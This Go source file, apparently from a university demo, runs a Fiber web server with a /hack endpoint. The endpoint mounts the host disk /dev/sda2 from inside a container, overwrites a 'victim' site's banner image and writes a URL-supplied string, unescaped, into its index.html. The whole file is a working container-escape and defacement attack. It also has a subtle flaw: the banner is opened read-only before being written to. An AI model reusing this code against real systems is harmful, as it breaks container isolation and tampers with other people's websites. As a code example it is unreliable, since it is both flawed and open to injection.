package main

import (
	"errors"
	"io"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"syscall"

	"github.com/gofiber/fiber/v2"
)

const (
	mount_point       = "/mnt/foo"
	mount_target      = "/dev/sda2"
	chief             = "./chief.png"
	secret_dir        = "/media/d/git/nsysu/cs/fhir/demo/victim/swag/config/www/"
	hack_image        = "banner.png"
	hack_index        = "index.html"
	pattern_signature = "Pattern passed:"
)

func overwrite_file(pattern string) error {
	src, chief_err := os.Open(chief)
	if chief_err != nil {
		return errors.New("Open chief " + chief_err.Error())
	}
	defer src.Close()
	img_dst, banner_err := os.Open(mount_point + secret_dir + hack_image)
	if banner_err != nil {
		return errors.New("Open banner " + banner_err.Error())
	}
	defer img_dst.Close()

	_, copy_err := io.Copy(img_dst, src)
	if copy_err != nil {
		return errors.New("Copy chief to banner " + copy_err.Error())
	}

	// Add pattern
	index_byte, index_err := ioutil.ReadFile(mount_point + secret_dir + hack_index)
	if index_err != nil {
		return errors.New("Open index " + index_err.Error())
	}

	lines := strings.Split(string(index_byte), "\n")
	for i, line := range lines {
		if strings.Contains(line, pattern_signature) {
			lines[i] = "Pattern passed: " + pattern
		}
	}
	output := strings.Join(lines, "\n")
	pattern_err := ioutil.WriteFile(mount_point+secret_dir+hack_index, []byte(output), 0644)
	if pattern_err != nil {
		return errors.New("Write pattern " + pattern_err.Error())
	}

	return nil
}

func do_escape(pattern string) string {

	if err := syscall.Mkdir(mount_point, 0777); err != nil && err.Error() != "file exists" {
		log.Fatalln("Mkdir " + err.Error())
		return err.Error()
	}
	defer syscall.Rmdir(mount_point)

	if err := syscall.Mount(mount_target, mount_point, "ext4", syscall.MS_SYNCHRONOUS, ""); err != nil {
		log.Fatalln("Mount " + err.Error())
		return err.Error()
	}
	defer syscall.Unmount(mount_point, 0)

	if err := overwrite_file(pattern); err != nil {
		log.Fatalln("Overwrite: " + err.Error())
		return err.Error()
	}

	return "Escape and write success!"
}

func main() {
	app := fiber.New()
	app.Get("/", func(c *fiber.Ctx) error {
		return c.SendString("Hello, hacker 👋!")
	})

	app.Get("/index", func(c *fiber.Ctx) error {
		return c.SendFile(hack_index)
	})

	app.Get("/hack/:pattern?", func(c *fiber.Ctx) error {
		pattern := c.Params("pattern")
		status := do_escape(pattern)
		return c.SendString(status)
	})

	log.Fatal(app.Listen(":3000"))
}
